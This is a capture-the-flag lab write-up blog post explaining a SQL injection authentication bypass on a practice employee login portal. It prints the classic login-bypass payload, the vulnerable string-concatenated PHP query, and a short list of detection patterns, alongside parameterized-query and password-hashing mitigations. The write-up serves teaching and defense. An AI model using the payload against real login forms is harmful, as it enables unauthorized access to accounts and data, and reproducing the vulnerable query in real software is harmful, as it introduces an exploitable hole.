---
title: "SQL Injection – Authentication Bypass on Employee Portal | Gatekeeper"
date: 2026-05-18 02:05:00 +0530
categories: [A05 - Injection, SQL Injection]
tags: [sqli, authentication-bypass, login-bypass, sql-injection, webversepro]
platform: WebVerse
author: Shivansh Sharma
image:
  path: /assets/images/posts/gatekeeper.webp
  alt: Gatekeeper WebVerse challenge
---

# Lab Link

https://dashboard.webverselabs-pro.com/challenges/gatekeeper

# Overview

The **Gatekeeper** challenge demonstrates a classic **SQL Injection authentication bypass** vulnerability.

The application contained an employee login portal intended to protect internal company resources. User-supplied input inside the login form was directly inserted into SQL queries without proper sanitization or parameterization.

Because user input modified query logic, authentication checks could be bypassed entirely without possessing valid credentials.

Once authenticated, access to internal company information became possible.

# Objective

Exploit the login functionality and gain access to the internal dashboard.

# Vulnerability Classification Hierarchy

```text
OWASP Category
└── A05: Injection
    └── SQL Injection
        └── Authentication Bypass SQLi
            └── Unsanitized Login Input in SQL Query
```

# Reconnaissance

The application login page was available at:

```text
https://b53ffc65-4065-gatekeeper-07550.challenges.webverselabs-pro.com/login
```

The portal requested:

```text
Email
Password
```

Login forms are common SQL injection targets because credentials are frequently placed directly into backend database queries.

# Exploitation

Testing began by injecting SQL syntax into the email field.

Email payload:

```sql
' or 1=1-- -
```

Password:

```text
anything
```

Submitted values:

```text
Email: ' or 1=1-- -

Password: anything
```

# Analysis

The injected payload works as follows:

```sql
' OR 1=1-- -
```

Breaking it down:

```text
'
```

Closes the original string.

```text
OR 1=1
```

Introduces a condition that always evaluates as true.

```text
-- -
```

Comments out the remaining SQL query.

The application query likely resembled:

```sql
SELECT *
FROM users
WHERE email='$email'
AND password='$password'
```

After injection:

```sql
SELECT *
FROM users
WHERE email=''
OR 1=1-- -
AND password='anything'
```

The database interprets:

```text
OR 1=1
```

as always true.

Authentication succeeds without valid credentials.

# Proof of Exploitation

After submitting the request, access was granted.

Redirected page:

```text
https://b53ffc65-4065-gatekeeper-07550.challenges.webverselabs-pro.com/dashboard
```

The internal dashboard became accessible.

Reading company memos revealed:

```text
WEBVERSE{.....}
```

Attack flow:

```text
Login Form
      ↓
SQL Injection
      ↓
Authentication Bypass
      ↓
Dashboard Access
      ↓
Sensitive Information Disclosure
```

# Root Cause

The application likely implemented login logic similar to:

```php
$query =
"SELECT * FROM users
WHERE email='$email'
AND password='$password'";
```

User input became part of executable SQL code.

The application failed to:

- Use parameterized queries
- Escape user input
- Separate code from data
- Apply secure authentication practices

# Impact

In real-world applications authentication bypass SQL injection can lead to:

- Administrative access
- Account takeover
- Sensitive data disclosure
- Database extraction
- Privilege escalation
- Remote code execution chains
- Complete application compromise

Authentication functionality is often one of the highest impact targets because compromise occurs before any authorization checks.

# Mitigation

## Use parameterized queries

Bad:

```php
$query=
"SELECT * FROM users
WHERE email='$email'
AND password='$password'";
```

Secure:

```php
$stmt=$db->prepare(
"SELECT *
FROM users
WHERE email=? AND password=?"
);

$stmt->execute(
[$email,$password]
);
```

## Apply input validation

Restrict unexpected input patterns where appropriate.

## Store passwords securely

Passwords should be stored using:

```text
bcrypt
Argon2
PBKDF2
```

rather than plaintext values.

## Implement monitoring

Alert on suspicious patterns such as:

```text
' OR 1=1
UNION SELECT
--
```

# Real-World Insight

Authentication bypass SQL injection remains one of the most recognizable web vulnerabilities because developers frequently build login queries directly from user input.

Common indicators during testing include:

- Login forms
- Search functionality
- Filters
- URL parameters
- Hidden fields

A common developer assumption is:

```text
Users only submit email addresses
```

Attackers interact with applications through crafted requests rather than intended UI behavior.